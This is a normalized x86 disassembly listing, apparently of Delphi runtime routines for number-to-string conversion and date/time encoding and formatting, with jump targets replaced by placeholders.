mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409531
jmp r-xdata
call sub_409653
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409531
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402cc0
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_409653
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409730
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4097e7
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4097f2
neg edx
mov ecx esi
call sub_4097f2
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4097e7
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_40980e
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402cc0
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4097f2
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_40980e
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409844
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_409230
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404030
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409874
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_409230
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404030
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4098c0
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404400
mov edx esp
xor ecx ecx
call sub_409730
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4098ec
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404400
mov edx esp
xor ecx ecx
call sub_409730
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409934
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409978
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4099e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409934
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407e0c
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407e0c
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407e0c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409a44
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409a80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409a44
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409b48
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409934
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407e0c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407e0c
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407e0c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409a44
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409c94
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409b48
pop esi
pop ecx
pop ebp
retn 0x8
sub_409cb4
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409934
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409cf0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028d8
sub_409d34
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404200
mov edx eax
mov eax ebx
call sub_409cf0
pop ecx
pop ebx
pop ebp
retn
sub_409d54
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408d20
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409cf0
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409da0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409dcc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409c94
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409e04
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4099e8
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409e44
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409f92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f40
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fd8
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409f99
lea eax [ ebp - 0x118 ]
call sub_403f40
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4041b0
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404200
mov edx eax
mov eax [ ebx ]
call sub_40c3bc
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c530
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404460
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c4cc
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404138
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c530
mov ecx eax
mov eax ebx
mov edx esi
call sub_404030
sub_409fac
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a08a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f40
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fd8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fd8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a091
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4041b0
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404200
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404460
sub_40a0b4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a835
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a83c
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403f64
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c5b0
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c590
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409cf0
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c5b0
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409cf0
pop ecx
mov al [ eax + lookup_table_40a197 ]
jmp [ eax * 4 + jump_table_40a1d0 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409da0
pop ecx
push ebp
call sub_409dcc
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409da0
pop ecx
push ebp
call sub_409dcc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409e44
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409d34
pop ecx
jmp r-xdata
push ebp
call sub_409da0
pop ecx
push ebp
call sub_409dcc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409fac
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409d34
pop ecx
jmp r-xdata
push ebp
call sub_409da0
pop ecx
push ebp
call sub_409dcc
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409da0
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409da0
pop ecx
push ebp
call sub_409e04
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409da0
pop ecx
push ebp
call sub_409e04
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409da0
pop ecx
push ebp
call sub_409e04
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409da0
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409da0
pop ecx
push ebp
call sub_409e04
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409e04
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408b90
test eax eax
jne r-xdata
push ebp
call sub_409da0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0b4
pop ecx
push ebp
call sub_409e04
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409d54
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409d54
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409d54
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409dcc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409d54
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409d54
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409d54
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0b4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0b4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409d54
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408b90
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409cf0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0b4
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409cf0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409cf0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409d34
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409cb4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d34
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408b90
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409cf0
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409cf0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409d34
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409cb4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d34
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c5b0
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408b90
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409cf0
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0b4
pop ecx
jmp r-xdata
jmp r-xdata
